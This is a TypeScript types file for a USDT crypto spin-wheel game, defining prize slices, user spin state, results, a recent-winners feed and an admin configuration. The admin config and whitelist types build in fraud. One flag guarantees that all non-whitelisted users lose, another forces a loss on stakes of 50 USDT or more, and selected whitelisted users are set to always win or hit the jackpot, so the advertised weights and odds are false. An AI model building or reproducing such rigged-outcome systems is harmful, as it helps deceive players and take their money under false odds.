export type SpinPrizeType = 'USDT' | 'APR_BOOST' | 'EXTRA_SPIN' | 'COMMISSION_BOOST' | 'TRY_AGAIN' | 'LOSS';

export interface SpinSlice {
  id: string;
  sliceIndex: number;
  label: string;
  sublabel?: string;
  prizeType: SpinPrizeType;
  prizeValue: number; // multiplier or base USDT value, e.g. 2 for 2x, 0 for loss, 50 for 50x Jackpot
  multiplier?: number;
  weight: number;     // Relative weight for weighted RNG
  probabilityPercent?: number; // Computed probability
  colorBg: string;    // Slice background hex/gradient
  colorText: string;  // Text color
  accentColor: string;// Border/glow accent
  iconName: string;   // Lucide icon identifier
  isJackpot?: boolean;
}

export interface UserSpinState {
  userId: string;
  availableSpins: number;
  dailySpinsRemaining: number;
  lastDailySpinAt: string | null;
  nextDailySpinAt: string | null;
  canClaimDailySpin: boolean;
  referralSpins: number;
  purchasedSpins: number;
  lifetimeSpinsCount: number;
  totalWonUsdt: number;
  totalBetUsdt?: number;
  activeAprBoostPercent: number; // Active temporary yield boost
  aprBoostExpiresAt: string | null;
}

export interface SpinResult {
  id: string;
  userId: string;
  sliceIndex: number;
  slice: SpinSlice;
  prizeType: SpinPrizeType;
  prizeValue: number;
  prizeText: string;
  betAmount: number;
  wonAmount: number;
  isWin: boolean;
  newBalance?: number;
  spinsRemaining: number;
  createdAt: string;
  transactionId?: string;
}

export interface RecentWinnerFeedItem {
  id: string;
  username: string;
  prizeLabel: string;
  prizeType: SpinPrizeType;
  prizeValue: number;
  timeAgo: string;
  isJackpot?: boolean;
}

export interface WhitelistedSpinUser {
  id: string;
  userId: string;
  username?: string;
  email?: string;
  outcomeMode: 'ALWAYS_WIN' | 'JACKPOT' | 'CUSTOM_SLICE' | 'HIGH_WIN_RATE';
  fixedSliceIndex?: number; // slice index 0 to 7
  customWinRatePercent?: number; // e.g. 100
  overrideHighStakeLoss?: boolean; // If true, this VIP user can win even with >50 USDT stakes
  isActive: boolean;
  notes?: string;
  createdAt: string;
}

export interface SpinAdminConfig {
  dailyFreeSpinsPerLevel: {
    level1: number;
    level2: number;
    level3: number;
    level4: number;
  };
  referralRewardSpinsPerDeposit: number;
  isWheelActive: boolean;
  minBetUsdt: number; // Min activation/stake amount (1 USDT)
  maxBetUsdt: number; // Max activation/stake amount (100 USDT)
  maxDailyPrizesUsdtCap: number;
  todayPrizesDistributedUsdt: number;
  jackpotNotificationThreshold: number;
  // House Profit & Target User Win/Loss Control
  forceLossForRegularUsers: boolean; // When true, all non-whitelisted users are guaranteed to lose!
  forcedLossStrategy: 'RANDOM_LOSS' | 'SPECIFIC_SLICE';
  forcedLossSliceIndex?: number;
  // High Stake Auto-Loss (50+ USDT = 100% Loss)
  autoLossOnHighStake: boolean;
  highStakeLossThreshold: number; // e.g. 50 USDT
  whitelistedProfitUsers: WhitelistedSpinUser[];
}



